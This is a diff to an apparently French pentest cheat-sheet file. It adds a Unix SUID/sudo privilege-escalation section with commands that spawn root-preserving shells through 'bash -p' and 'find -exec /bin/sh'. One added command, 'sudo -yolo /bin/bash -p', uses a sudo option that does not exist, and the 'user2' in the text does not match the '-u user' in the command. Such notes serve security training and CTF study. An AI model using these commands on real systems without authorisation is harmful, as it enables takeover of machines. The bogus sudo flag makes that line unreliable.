@@ -258,6 +258,13 @@ What to do with a binary having a setUID bit ?
 </code></pre>
 "
 
+;;;;;;;;;;;;;;;;;;;; cmds
+[section-privesc-cmds]
+id=section
+category=PrivEscUx
+title="SUID/Sudo exploitation"
+title_en="SUID/Sudo exploitation"
+
 
 [shell]
 id=shell
@@ -324,7 +331,9 @@ keywords=
 title="Sudo/SUID bit - bash"
 desc="
 Lancé par sudo ou avec un SUID bit, bash va dropper ses privilèges. Pour garder l'identifiant root, utiliser l'option -p.
-<pre><code>bash -p
+<pre><code>sudo -yolo /bin/bash -p
+</code></pre>
+<pre><code>./bash -p
 </code></pre>
 "
 title_en="Sudo/SUID bit - bash"
@@ -341,9 +350,13 @@ category=PrivEscUx
 keywords=
 title="Sudo/SUID bit - find"
 desc="
-Pour lancer un shell avec find, rechercher un fichier dans le répertoire courant, et lancer la commande /bin/sh.
+Il est possible d'utiliser la commande -exec de find pour ouvrir un shell.   
+On recherche n'importe quel fichier, et c'est un prétexte pour lancer la commande /bin/sh.   
+Ici avec un sudo, le shell sera ouvert en tant que user2:   
 <pre><code>sudo -u user /usr/bin/find . -name readme.txt -exec /bin/sh \;
-./find . -name readme.txt -exec /bin/sh \;
+</code></pre>
+Si on trouve la commande find, copiée dans un répertoire avec le SUID bit actif, on l'exploite de la même façon:
+<pre><code>./find . -name readme.txt -exec /bin/sh \;
 </code></pre>
 "
 title_en="Sudo/SUID bit - find"
